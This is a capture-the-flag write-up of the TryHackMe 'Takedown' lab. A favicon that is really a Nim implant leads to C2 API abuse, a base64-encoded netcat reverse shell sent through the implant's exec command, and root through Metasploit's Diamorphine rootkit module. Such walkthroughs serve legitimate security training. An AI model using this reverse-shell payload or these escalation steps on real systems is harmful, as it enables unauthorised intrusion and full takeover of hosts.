---
title: "Takedown"
type: docs
tags:
  - thm
  - linux
  - insane
  - malware-analysis
  - c2
  - api
  - diamorphine
  - dfir
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Insane, **IP:** 10.10.210.11 (`takedown.thm.local`)

</div>

<div class="callout callout-abstract">

**Attack Path**

1. This is a "take down the C2" scenario. The site's `favicon.ico` is actually a **Nim implant**, `strings` it to recover the C2 API endpoints (`/api/agents`, `/api/agents/register`) and the magic **User-Agent** suffix (`z.5.x.2.l.8.y.5`) the server requires.
2. With the right UA, `GET /api/agents` lists a registered agent id (`qizg-ilom-cbks-uhua` → `www-infinity`). `/api/agents/commands` lists supported ops including **`exec`**.
3. `POST /api/agents/<id>/exec {"cmd":"exec <base64 rev shell> | base64 -d | bash"}` → shell as `www-infinity`.
4. Root: the box runs the **Diamorphine** rootkit (`/usr/share/diamorphine_secret/svcgh0st`) configured for signal **64** → Metasploit `exploit/linux/local/diamorphine_rootkit_signal_priv_esc` → root. (PwnKit also works.)

</div>

---

## Full Walkthrough

### Nmap scan

```bash
Nmap scan report for takedown.thm.local (10.10.210.11)
Host is up, received user-set (0.11s latency).
Scanned at 2025-05-19 04:27:35 EDT for 753s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.23.1
|_http-server-header: nginx/1.23.1
| http-headers: 
|   Server: nginx/1.23.1
|   Date: Mon, 19 May 2025 08:40:03 GMT
|   Content-Type: text/html; charset=UTF-8
|   Content-Length: 25844
|   Connection: close
|   Last-Modified: Thu, 28 Jul 2022 18:20:10 GMT
|   ETag: "64f4-5e4e195780a80"
|   Accept-Ranges: bytes
|   Vary: Accept-Encoding
|   
|_  (Request type: HEAD)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Working through the task files, something under the indicators of compromise section caught my attention. I pulled the site's `favicon.ico` down directly, ran `strings` against it, and combed through the output looking for anything that didn't belong in an ordinary icon file. A few things stood out immediately:


![Pasted image 20250519044207](Pasted-image-20250519044207.png)

![Pasted image 20250519044237](Pasted-image-20250519044237.png)

Buried in that output were what looked like real API endpoints:

```bash
http://takedown.thm.local/api/agents/
http://takedown.thm.local/api/agents/register
```

Digging further into the `favicon.ico` binary, I confirmed it wasn't an icon at all, it was a compiled Nim payload disguised behind an image extension.

![Pasted image 20250519050805](Pasted-image-20250519050805.png)

Applying the same scrutiny to the other static assets on the site turned up a second artifact, `shutterbug.jpg.bak`, further confirmation that this box had already been compromised by the scenario's threat actor before I ever touched it.

### Investigating the API

Going back to the malware artifacts, I wanted to see what these API endpoints actually returned under normal conditions. Hitting them directly through Burp got me nowhere at first, every request just fell through silently, but comparing that behavior against clues from the implant told me the server was gating access behind a very specific User-Agent string. Appending that suffix to an ordinary browser User-Agent got me through:

```http
GET /api/agents HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: http://takedown.thm.local
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://takedown.thm.local/
Priority: u=0
```

### Response

```http
HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Mon, 19 May 2025 09:23:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 39
Connection: keep-alive
Keep-Alive: timeout=20
Access-Control-Allow-Origin: http://takedown.thm.local
Vary: Origin

{'qizg-ilom-cbks-uhua': 'www-infinity'}
```

### Getting RCE

```http
GET /api/agents/commands HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: http://takedown.thm.local
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://takedown.thm.local/
Priority: u=0
```

#### Response

```http
HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Mon, 19 May 2025 09:40:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 201
Connection: keep-alive
Keep-Alive: timeout=20
Access-Control-Allow-Origin: http://takedown.thm.local
Vary: Origin

Available Commands: ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', 'get_hostname']
```

That gave me a full list of commands the implant supports, and `exec` was exactly what I needed to pursue next to get an actual shell.

```HTTP
POST /api/agents/qizg-ilom-cbks-uhua/exec HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Length: 12
Origin: http://takedown.thm.local
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://takedown.thm.local/
Priority: u=0
Content-Type: application/json;charset=UTF-8

{"cmd":"id"}
```

```http
HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Mon, 19 May 2025 09:43:53 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 26
Connection: keep-alive
Keep-Alive: timeout=20
Access-Control-Allow-Origin: http://takedown.thm.local
Vary: Origin

New commnad to execute: id
```


Encoding a full reverse-shell one-liner in base64 and feeding it through `exec` was enough to pop a working shell back to my listener:

```http
POST /api/agents/qizg-ilom-cbks-uhua/exec HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Length: 148
Origin: http://takedown.thm.local
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://takedown.thm.local/
Priority: u=0
Content-Type: application/json;charset=UTF-8

{"cmd":"exec echo -n 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTAuMjEuMjMuMjM1IDkwMDEgPi90bXAvZg==' | base64 -d | bash"}
```

### System Enumeration

Running `linpeas` on the box surfaced a couple of things worth chasing, most notably a process that had no business being in a normal userland listing:

```bash
╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
runc was found in /sbin/runc, you may be able to escalate privileges with it

╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"


```

```bash
webadmi+    1922  0.1  0.2   3328  2052 ?        Ss   08:30   0:11 /usr/share/diamorphine_secret/svcgh0st
```

#### GETTING ROOT

At this point I'd run out of obvious leads, even checking for internal services I could forward to my own machine came up empty, so I decided to run Metasploit's local exploit suggester against the box just to be thorough:

```bash
 #   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                Yes                      The target is vulnerable.
 2   exploit/linux/local/diamorphine_rootkit_signal_priv_esc            Yes                      The target is vulnerable. Diamorphine is installed and configured to handle signal '64'.
 3   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
 4   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.8.31.pre.1ubuntu1.2 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module

```

Several modules came back as candidates, but `diamorphine_rootkit_signal_priv_esc` was the one that mattered to me, since I'd already spotted that suspicious `svcgh0st` process tied to Diamorphine running as a service during enumeration. I ran that module directly against the target:

```bash
msf6 exploit(linux/local/diamorphine_rootkit_signal_priv_esc) > run
[*] Started reverse TCP handler on 10.21.23.235:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Executing id ...
uid=0(root) gid=0(root) groups=0(root),1001(webadmin-lowpriv)
[+] The target is vulnerable. Diamorphine is installed and configured to handle signal '64'.
[*] Writing '/tmp/.VktpAgjFZBau' (250 bytes) ...
[*] Executing /tmp/.VktpAgjFZBau & echo  ...
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 10.10.210.11
[+] Deleted /tmp/.VktpAgjFZBau
[*] Meterpreter session 3 opened (10.21.23.235:4444 -> 10.10.210.11:33254) at 2025-05-19 07:05:34 -0400

meterpreter > shell
Process 65527 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root),1001(webadmin-lowpriv)
```

The Diamorphine signal handler did exactly what the suggester promised: the moment the exploit sent its trigger signal, my dropped stager executed with root privileges and Meterpreter handed me a fully privileged shell, closing out the "take down the C2" scenario as root on its own attacker infrastructure.
